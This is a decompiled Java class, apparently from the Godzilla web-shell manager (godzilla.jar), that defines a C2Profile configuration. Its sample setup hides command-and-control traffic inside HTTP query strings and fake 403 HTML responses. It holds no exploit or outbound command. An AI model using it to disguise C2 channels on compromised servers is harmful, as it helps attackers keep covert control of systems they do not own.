/*     */ package core.c2profile;
/*     */ 
/*     */ import core.c2profile.config.BasicConfig;
/*     */ import core.c2profile.config.CoreConfig;
/*     */ import core.c2profile.location.ChannelLocationEnum;
/*     */ import java.nio.file.Files;
/*     */ import java.nio.file.Paths;
/*     */ import java.util.HashMap;
/*     */ import org.yaml.snakeyaml.DumperOptions;
/*     */ import org.yaml.snakeyaml.Yaml;
/*     */ import org.yaml.snakeyaml.annotation.YamlClass;
/*     */ import org.yaml.snakeyaml.annotation.YamlComment;
/*     */ import org.yaml.snakeyaml.introspector.BeanAccess;
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ @YamlClass
/*     */ public class C2Profile
/*     */ {
/*     */   @YamlComment(Comment = "支持的Payload")
/*  49 */   public String supportPayload = "ALL"; @YamlComment(Comment = "基础配置")
/*  50 */   public BasicConfig basicConfig = new BasicConfig(); @YamlComment(Comment = "核心配置")
/*  51 */   public CoreConfig coreConfig = new CoreConfig(); @YamlComment(Comment = "静态变量")
/*  52 */   public HashMap staticVars = new HashMap<>();
/*     */   @YamlComment(Comment = "信道定位方式")
/*  54 */   public ChannelLocationEnum channelLocation = ChannelLocationEnum.FIND;
/*     */   @YamlComment(Comment = "Request配置")
/*  56 */   public C2Request request = new C2Request(); @YamlComment(Comment = "Response配置")
/*  57 */   public C2Response response = new C2Response();
/*     */   @YamlComment(Comment = "Payload配置")
/*  59 */   public HashMap payloadConfigs = new HashMap<>();
/*     */   @YamlComment(Comment = "Response配置")
/*  61 */   public HashMap pluginConfigs = new HashMap<>();
/*     */   
/*     */   public static final String CHANNEL_NAME = "@@@CHANNEL";
/*     */   
/*     */   public static void main(String[] args) throws Throwable {
/*  66 */     DumperOptions dumperOptions = new DumperOptions();
/*  67 */     dumperOptions.setProcessComments(true);
/*  68 */     dumperOptions.setPrettyFlow(true);
/*     */ 
/*     */ 
/*     */ 
/*     */     
/*  73 */     C2Profile profile = new C2Profile();
/*     */     
/*  75 */     profile.channelLocation = ChannelLocationEnum.SUB;
/*     */     
/*  77 */     profile.basicConfig.mergeResponseCookie = true;
/*     */     
/*  79 */     profile.basicConfig.clearup = true;
/*     */     
/*  81 */     profile.basicConfig.commandMode = CommandMode.EASY;
/*     */     
/*  83 */     profile.basicConfig.useDefaultProxy = true;
/*     */     
/*  85 */     profile.coreConfig.errRetryNum = 100;
/*  86 */     profile.coreConfig.enabledErrRetry = true;
/*  87 */     profile.coreConfig.enabledDetailLog = true;
/*     */     
/*  89 */     profile.request.requestQueryString = "@@@CHANNEL";
/*  90 */     profile.request.enabledRequestBody = false;
/*  91 */     profile.response.responseCode = 403;
/*  92 */     profile.response.responseLeftBody = "<html>".getBytes();
/*  93 */     profile.response.responseRightBody = "</html>".getBytes();
/*  94 */     profile.response.responseMiddleBody = "@@@CHANNEL";
/*     */ 
/*     */     
/*  97 */     Yaml yaml = new Yaml(dumperOptions);
/*  98 */     yaml.setBeanAccess(BeanAccess.FIELD);
/*     */     
/* 100 */     Files.write(Paths.get("c2.yaml", new String[0]), yaml.dumpAsMap(profile).getBytes(), new java.nio.file.OpenOption[0]);
/*     */     
/* 102 */     System.out.println(yaml.dumpAsMap(profile));
/*     */   }
/*     */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\core\c2profile\C2Profile.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */